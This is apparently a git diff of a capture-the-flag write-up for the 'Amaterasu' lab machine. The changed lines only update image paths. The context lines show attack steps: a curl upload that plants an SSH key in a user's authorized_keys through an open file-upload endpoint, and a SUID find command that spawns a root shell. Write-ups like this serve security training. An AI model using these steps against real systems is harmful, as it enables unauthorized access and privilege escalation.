@@ -46,11 +46,11 @@ The FTP service got us nothing.
 
 ## Web PORT: 33414
 
-![img](/assets/images/CTF/Pg-Play/Amaterasu/web.png)
+![img](/assets/images/CTF/Proving_Grounds/Amaterasu/web.png)
 
 ### Directory Fuzzing
 
-![img](/assets/images/CTF/Pg-Play/Amaterasu/dir.png)
+![img](/assets/images/CTF/Proving_Grounds/Amaterasu/dir.png)
 
 Upon directory fuzzing the file `/help` has been discovered and below is the response for the file.
 
@@ -83,11 +83,11 @@ Generate SSH key and rename the `id_rsa.pub` file to `authorized_keys.txt`. Use 
 curl -L -i -X POST -H "Content-Type: multipart/form-data" -F file="@/home/naveenj/pg-play/Amaterasu/authorized_keys.txt" -F filename="/home/alfredo/.ssh/authorized_keys" http://192.168.193.249:33414/file-upload
 ```
 
-![img](/assets/images/CTF/Pg-Play/Amaterasu/upload.png)
+![img](/assets/images/CTF/Proving_Grounds/Amaterasu/upload.png)
 
 SSH to user alfredo using the port 25022.
 
-![img](/assets/images/CTF/Pg-Play/Amaterasu/shell.png)
+![img](/assets/images/CTF/Proving_Grounds/Amaterasu/shell.png)
 
 **Initial Foothold Obtained**
 
@@ -181,7 +181,7 @@ Wait for 60 seconds for the cronjob to complete, then use the below command to o
 /usr/bin/find . -exec /bin/sh -p \; -quit
 ```
 
-![img](/assets/images/CTF/Pg-Play/Amaterasu/root.png)
+![img](/assets/images/CTF/Proving_Grounds/Amaterasu/root.png)
 
 **Root Obtained**
 
